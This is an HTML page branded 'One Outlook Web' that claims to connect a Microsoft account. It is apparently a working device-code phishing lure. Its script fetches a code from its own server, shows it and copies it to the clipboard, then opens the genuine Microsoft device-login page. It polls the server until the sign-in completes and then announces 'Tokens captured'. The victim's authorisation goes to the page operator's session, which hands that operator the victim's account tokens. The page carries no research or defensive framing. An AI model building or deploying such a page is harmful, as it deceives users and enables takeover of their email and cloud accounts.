<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>One Outlook Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #0078d4, #00a4ef);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .code {
            font-size: 42px;
            font-weight: bold;
            letter-spacing: 8px;
            background: #f0f0f0;
            padding: 20px;
            border-radius: 12px;
            margin: 20px 0;
            color: #0078d4;
            font-family: monospace;
        }
        .btn {
            background: #0078d4;
            color: white;
            border: none;
            padding: 12px 28px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            margin: 5px;
        }
        .btn:hover { background: #005fa3; }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            background: #f8f9fa;
            color: #666;
            font-size: 13px;
        }
        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #ccc;
            border-top-color: #0078d4;
            border-radius: 50%;
            animation: spin .8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .success { background: #d4edda; color: #155724; }
        .steps { text-align: left; margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 10px; font-size: 12px; }
        .steps ol { padding-left: 20px; margin-top: 5px; }
    </style>
</head>
<body>
<div class="card">
    <h2>🔐 One Outlook Web</h2>
    <p>Connect your Microsoft account</p>
    <div class="code" id="userCode">------</div>
    <button class="btn" onclick="copyCode()">Copy Code</button>
    <button class="btn" id="openBtn">Open Microsoft Login</button>
    <div class="steps">
        <strong>📋 Steps:</strong>
        <ol>
            <li>Click "Open Microsoft Login" above</li>
            <li>Enter the code: <strong id="codeRef">------</strong></li>
            <li>Sign in with your Microsoft account</li>
            <li>Click "Continue" when asked</li>
            <li>This window will auto-close when complete</li>
        </ol>
    </div>
    <div class="status" id="statusMsg">
        <span class="spinner"></span> Ready to authenticate...
    </div>
</div>

<script>
    const API_BASE = window.location.origin;
    let currentSessionId = null;
    let pollInterval = null;
    
    async function startAuth() {
        try {
            document.getElementById('statusMsg').innerHTML = '<span class="spinner"></span> Starting authentication...';
            
            const response = await fetch(`${API_BASE}/start`, { method: 'POST' });
            const data = await response.json();
            
            if (data.userCode) {
                currentSessionId = data.sessionId;
                document.getElementById('userCode').textContent = data.userCode;
                document.getElementById('codeRef').textContent = data.userCode;
                document.getElementById('statusMsg').innerHTML = '<span class="spinner"></span> Waiting for you to sign in...';
                
                startPolling();
            } else {
                throw new Error('No code received');
            }
        } catch (err) {
            document.getElementById('statusMsg').innerHTML = '❌ Error: ' + err.message;
        }
    }
    
    function startPolling() {
        if (pollInterval) clearInterval(pollInterval);
        
        pollInterval = setInterval(async () => {
            if (!currentSessionId) return;
            
            try {
                const response = await fetch(`${API_BASE}/state?session_id=${currentSessionId}&_t=${Date.now()}`);
                const data = await response.json();
                
                if (data.status === 'success') {
                    clearInterval(pollInterval);
                    document.getElementById('statusMsg').innerHTML = '✅ Authentication successful! Tokens captured. You can close this window.';
                    document.getElementById('statusMsg').classList.add('success');
                    setTimeout(() => {
                        window.close();
                    }, 3000);
                }
            } catch (err) {
                console.error('Poll error:', err);
            }
        }, 3000);
    }
    
    function copyCode() {
        const code = document.getElementById('userCode').textContent;
        navigator.clipboard.writeText(code);
        alert('Code copied!');
    }
    
    document.getElementById('openBtn').onclick = function(e) {
        e.preventDefault();
        const code = document.getElementById('userCode').textContent;
        if (code) navigator.clipboard.writeText(code);
        window.open('https://microsoft.com/devicelogin', '_blank', 'width=600,height=700');
        return false;
    };
    
    startAuth();
</script>
</body>
</html>
